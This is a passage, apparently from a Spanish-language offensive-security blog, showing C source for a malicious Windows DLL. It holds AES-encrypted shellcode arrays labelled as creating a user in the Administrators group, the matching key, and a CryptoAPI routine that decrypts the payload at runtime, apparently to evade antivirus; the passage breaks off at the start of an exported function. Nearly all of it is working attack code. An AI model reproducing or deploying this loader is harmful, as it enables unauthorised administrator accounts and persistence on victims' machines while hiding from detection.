class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xe8</span> <span class="p">};</span>
</code></pre></div></div>

<p>El código fuente por lo tanto nos quedará del siguiente modo:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include</span> <span class="cpf">&lt;psapi.h&gt;</span><span class="cp">
</span>



<span class="k">extern</span> <span class="s">"C"</span><span class="p">{</span> 
<span class="c1">// create_admin_user Administrator group (OS version En)</span>
<span class="c1">//unsigned char payload[] =  { 0x7e, 0xb6, 0x5c, 0x44, 0xbf, 0x80, 0x72, 0x30, 0xee, 0xb, 0x1b, 0xf1, 0x62, 0x22, 0x5d, 0x96, 0xa, 0x16, 0x52, 0xfc, 0x26, 0x92, 0xcf, 0xdd, 0x40, 0x94, 0x76, 0x30, 0xcf, 0x49, 0xe9, 0xfc, 0xbc, 0xdf, 0x3a, 0xc, 0xf4, 0xcf, 0xe9, 0x7, 0xfc, 0x7f, 0xf, 0x17, 0xb3, 0x71, 0x6d, 0x3d, 0x71, 0xf4, 0x17, 0xbb, 0xa7, 0x41, 0x4, 0x77, 0x6b, 0x1a, 0xde, 0x67, 0xdb, 0x5f, 0x92, 0x2e, 0xaf, 0x3b, 0x54, 0xe0, 0xfb, 0xcd, 0x18, 0xbe, 0x28, 0x1, 0x30, 0xdd, 0x7a, 0x26, 0x64, 0xe0, 0x17, 0x2f, 0x3f, 0x15, 0x7b, 0xf8, 0x1d, 0x69, 0xeb, 0x92, 0xfe, 0x9b, 0xfd, 0x67, 0xe5, 0xc, 0xf2, 0xe7, 0xbb, 0x65, 0x20, 0x8a, 0xcc, 0xd1, 0xc5, 0x8a, 0x9d, 0x39, 0x7d, 0xcb, 0xd5, 0x3, 0xf2, 0x1f, 0xac, 0x45, 0xe7, 0x93, 0x36, 0xc5, 0x0, 0x7a, 0xc3, 0x6f, 0xe4, 0x72, 0x8f, 0x95, 0x86, 0x74, 0xcf, 0x30, 0xc1, 0xb8, 0x29, 0xee, 0xd2, 0xf3, 0x8b, 0xa8, 0xac, 0x3c, 0x95, 0xc9, 0xd6, 0x21, 0x36, 0x62, 0x5e, 0x9f, 0x2b, 0xf8, 0xc4, 0xb4, 0x4e, 0x12, 0xe4, 0xb, 0x29, 0x68, 0x87, 0xf0, 0xe0, 0x8f, 0x63, 0x10, 0xe0, 0xeb, 0x5b, 0xaf, 0xf8, 0x4a, 0x7d, 0xb, 0x51, 0x8c, 0x30, 0x2, 0xb3, 0x7e, 0xec, 0x5, 0x43, 0x2d, 0x8d, 0x91, 0x33, 0x22, 0x6e, 0x1a, 0xa0, 0x60, 0x3a, 0xc1, 0x17, 0x73, 0x8d, 0xd3, 0x4f, 0x27, 0x25, 0x56, 0x19, 0x7b, 0xa8, 0xc, 0xfb, 0xe7, 0x4e, 0x23, 0xe9, 0x99, 0x59, 0x18, 0xef, 0xd4, 0x8a, 0xf0, 0x15, 0x9d, 0xd7, 0x9f, 0x37, 0x5f, 0x89, 0x56, 0x48, 0xb1, 0x7b, 0x82, 0x5b, 0xdd, 0xa0, 0x54, 0x7f, 0x91, 0xc9, 0xc1, 0xa, 0x15, 0x11, 0x48, 0x4e, 0xb3, 0x32, 0x37, 0xe1, 0x79, 0xcd, 0x4b, 0x98, 0xc, 0x21, 0x0, 0x4, 0xc9, 0x6d, 0x90, 0xe6, 0x9a, 0xef, 0xf9, 0x81, 0xab, 0x13, 0x4b, 0x4f, 0x43, 0xb4, 0xa9, 0xa7, 0x74, 0x2f, 0xa0, 0xf7, 0x28, 0xed, 0x30, 0xb3, 0x91, 0xcb, 0x9c, 0x42, 0xf8, 0xcf, 0x63, 0x4, 0xe5, 0x82, 0x98, 0xe5, 0x93, 0x37, 0x5, 0x9a, 0xe3, 0x56, 0x96, 0x16, 0x6f, 0x31, 0x8d, 0x33, 0xb1, 0x90, 0x66, 0x57, 0xd1, 0x7c, 0xe3, 0xa6, 0xd8, 0x34, 0x9b, 0xc3, 0xaa, 0x29, 0x8d, 0x3d, 0x97, 0xff, 0xc1, 0x8b, 0x98, 0x20, 0x90, 0x93, 0x8f, 0x8c, 0x44, 0xdf, 0x8a, 0x14, 0x15, 0xfc, 0x81, 0xaf, 0x43, 0x68, 0x4d, 0xb0, 0x33, 0xf9, 0x67, 0x4e, 0xe7, 0x9b, 0xe9, 0x68, 0xa2, 0x4, 0x81, 0xe8, 0xf8, 0x34, 0x59, 0xdb, 0x12, 0xb4, 0xcd, 0x8, 0x37, 0x2c, 0xd3, 0x66, 0xdd, 0xe8, 0xbe, 0xd1, 0x9e, 0x62, 0xe5, 0x64, 0x1a, 0x8d, 0x9e, 0x65, 0x19, 0x8f, 0x44, 0xce, 0x87, 0xd, 0x63 };</span>
<span class="c1">//unsigned char key[] = { 0x73, 0xbd, 0xab, 0x26, 0x32, 0x46, 0x29, 0x9b, 0x6, 0xeb, 0xc, 0x5d, 0x43, 0x39, 0x66, 0x53 };</span>
<span class="c1">// create_admin_user grupo Administradores (OS version Es)</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x44</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xea</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xc1</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x6b</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x17</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0xb0</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x97</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0x2d</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x9</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xf5</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0xb1</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x27</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0xad</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0xc4</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xab</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x51</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0xa6</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0xaf</span><span class="p">,</span> <span class="mh">0xe1</span><span class="p">,</span> <span class="mh">0xdb</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0xc9</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x89</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0xdd</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xd7</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x8c</span><span class="p">,</span> <span class="mh">0xf2</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xed</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0xc7</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xc2</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0xe7</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xcd</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x34</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x13</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0xc</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x9b</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0xa5</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x76</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0xb5</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xe8</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0xaa</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0x7f</span> <span class="p">};</span>

<span class="kt">int</span> <span class="n">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
        <span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
        <span class="n">HCRYPTKEY</span> <span class="n">hKey</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptAcquireContextW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hProv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">PROV_RSA_AES</span><span class="p">,</span> <span class="n">CRYPT_VERIFYCONTEXT</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptCreateHash</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_SHA_256</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">hHash</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptHashData</span><span class="p">(</span><span class="n">hHash</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span><span class="o">*</span><span class="p">)</span><span class="n">key</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span><span class="p">)</span><span class="n">keylen</span><span class="p">,</span> <span class="mi">0</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>              
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDeriveKey</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="n">CALG_AES_256</span><span class="p">,</span> <span class="n">hHash</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">hKey</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">CryptDecrypt</span><span class="p">(</span><span class="n">hKey</span><span class="p">,</span> <span class="p">(</span><span class="n">HCRYPTHASH</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">BYTE</span> <span class="o">*</span><span class="p">)</span> <span class="n">payload</span><span class="p">,</span> <span class="p">(</span><span class="n">DWORD</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">payload_len</span><span class="p">)){</span>
                        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
        
        <span class="n">CryptReleaseContext</span><span class="p">(</span><span class="n">hProv</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
        <span class="n">CryptDestroyHash</span><span class="p">(</span><span class="n">hHash</span><span class="p">);</span>
        <span class="n">CryptDestroyKey</span><span class="p">(</span><span class="n">hKey</span><span class="p">);</span>
        
        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
<span class="kr">__declspec</span><span class="p">(</span><span class="n">dllexport</span><span class="p">)</span> <span class="kt">void</span> <span class="n">f0ns1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
